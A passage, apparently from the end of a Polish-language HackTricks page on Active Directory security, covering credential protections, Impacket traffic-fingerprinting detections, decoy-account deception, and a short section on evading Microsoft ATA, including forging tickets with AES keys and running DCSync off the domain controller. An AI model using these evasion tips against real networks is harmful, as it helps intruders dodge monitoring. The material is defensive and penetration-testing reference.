- Ściśle ograniczone polecenia usuwania (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itd.) umożliwiają szybkie wycofanie zmian po pozyskaniu przez operatora poświadczeń lub persistence, minimalizując telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Ogólne środki obrony

[**Dowiedz się więcej o ochronie poświadczeń tutaj.**](../stealing-credentials/credentials-protections.md)

### **Środki ochrony poświadczeń**

- **Ograniczenia dla Domain Admins**: Zaleca się, aby Domain Admins mogli logować się wyłącznie do Domain Controllers, unikając ich użycia na innych hostach.
- **Uprawnienia kont usług**: Usługi nie powinny działać z uprawnieniami Domain Admin (DA), aby zachować bezpieczeństwo.
- **Czasowe ograniczenie uprawnień**: W przypadku zadań wymagających uprawnień DA czas ich obowiązywania powinien być ograniczony. Można to osiągnąć za pomocą: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Ograniczanie LDAP relay**: Audytuj identyfikatory zdarzeń 2889/3074/3075, a następnie wymuś LDAP signing oraz LDAPS channel binding na DC/klientach, aby blokować próby LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting na poziomie protokołu aktywności Impacket

Jeśli chcesz wykrywać typowe tradecraft AD, **nie polegaj wyłącznie na artefaktach kontrolowanych przez operatora**, takich jak zmienione nazwy plików binarnych, nazwy usług, tymczasowe pliki wsadowe lub ścieżki wyjściowe. Ustal baseline tego, jak legalne klienty Windows generują ruch [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC i WMI, a następnie szukaj **cech implementacji**, które pozostają nawet po edycji przez operatora plików `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` lub `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Kandydaci o wysokiej pewności, działający samodzielnie** (po zweryfikowaniu względem własnego baseline):
- Uwierzytelniony DCE/RPC z użyciem `auth_context_id = 79231 + ctx_id`
- Wypełnienie paddingu uwierzytelniania DCE/RPC wartością `0xff`
- Bindowania LDAP Kerberos umieszczające surowy Kerberos `AP-REQ` bezpośrednio w `mechToken` SPNEGO
- Żądania negotiate SMB2/3 z wartościami `ClientGuid` wyglądającymi jak ASCII
- WMI `IWbemLevel1Login::NTLMLogin` używające niestandardowej przestrzeni nazw `//./root/cimv2`
- Zahardkodowane wartości nonce Kerberos
- **Lepsze jako cechy korelacji/punktacji**:
- Rzadkie lub zduplikowane listy etype Kerberos, nietypowe/brakujące `PA-DATA` lub kolejność etype w TGS-REQ różniąca się od natywnego Windows
- Wiadomości NTLM Type 1 bez informacji o wersji lub wiadomości Type 3 z pustymi nazwami hostów
- Surowy NTLMSSP przenoszony w DCE/RPC zamiast SPNEGO, brak trailerów weryfikacyjnych DCE/RPC lub niezgodności OID SPNEGO/Kerberos
- Kilka takich cech z tego samego hosta/użytkownika/sesji/przedziału czasowego jest znacznie silniejszym sygnałem niż pojedyncze słabe pole
- **Używaj jako enrichment, nie jako samodzielnych alertów**:
- Domyślne nazwy plików, ścieżki wyjściowe, losowe nazwy usług, tymczasowe nazwy plików wsadowych, domyślne nazwy kont komputerów oraz specyficzne dla narzędzi ciągi HTTP/WebDAV/RDP/MSSQL
- Operatorzy mogą je łatwo zmienić, dlatego najlepiej wykorzystywać je do wyjaśnienia, dlaczego klaster cross-protocol jest podejrzany
- **Uwagi operacyjne**:
- Niektóre z tych sygnałów wymagają odszyfrowanego ruchu, [analizy PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW lub widoczności po stronie usługi
- Przed przekształceniem ich w alerty zweryfikuj je względem klientów Samba/Linux, urządzeń oraz starszego oprogramowania
- W miarę zwiększania pewności co do baseline przenoś detekcje z enrichment -> hunting -> alerting

### **Implementing Deception Techniques**

- Implementowanie deception obejmuje zastawianie pułapek, takich jak decoy users lub computers, z cechami takimi jak hasła, które nie wygasają, lub oznaczenie jako Trusted for Delegation. Szczegółowe podejście obejmuje tworzenie użytkowników z określonymi uprawnieniami lub dodawanie ich do grup o wysokich uprawnieniach.<sup>[[2]](#references)</sup>
- Praktyczny przykład obejmuje użycie narzędzi takich jak: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Więcej informacji o wdrażaniu deception można znaleźć na stronie [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **Dla obiektów użytkowników**: Podejrzane wskaźniki obejmują nietypowy ObjectSID, rzadkie logowania, daty utworzenia oraz niską liczbę nieudanych prób podania hasła.
- **Wskaźniki ogólne**: Porównanie atrybutów potencjalnych decoy objects z atrybutami prawdziwych obiektów może ujawnić niespójności. Narzędzia takie jak [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogą pomóc w identyfikowaniu takich deception.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Unikanie enumeracji sesji na Domain Controllers w celu zapobiegania detekcji ATA.
- **Ticket Impersonation**: Wykorzystywanie kluczy **aes** do tworzenia ticketów pomaga omijać detekcję, ponieważ nie następuje downgrade do NTLM.
- **DCSync Attacks**: Zaleca się wykonywanie ich z hosta innego niż Domain Controller w celu uniknięcia detekcji ATA, ponieważ bezpośrednie wykonanie z Domain Controller wywoła alerty.

## References

- [1] [Przewodnik po atakowaniu relacji zaufania domen](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Fałszowanie relacji zaufania na potrzeby deception w Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Od Domain Admin do Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Kolekcja LDAP BOF – narzędzie LDAP działające w pamięci do exploitation Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Wykorzystywanie hashy NTLM jako wordlisty](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – analiza Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon – Onelogon: przejmowanie kont Active Directory przez Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft – Jak zarządzać zmianami w bezpiecznych połączeniach kanału Netlogon związanymi z CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Podróż do zapomnianych interfejsów Null Session i MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Filtr SID jako granica bezpieczeństwa między domenami? (Część 4) – badania nad omijaniem filtrowania SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Filtr SID jako granica bezpieczeństwa między domenami? (Część 5) – atak Golden GMSA trust – od child do parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Filtr SID jako granica bezpieczeństwa między domenami? (Część 6) – atak Schema change trust – od child do parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Od DA do EA z ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Eskalacja z administratorów child domain do enterprise admins w 5 minut przez nadużycie AD CS – kontynuacja](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE w rękawie: projektowanie backdoorów Active Directory DACL](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
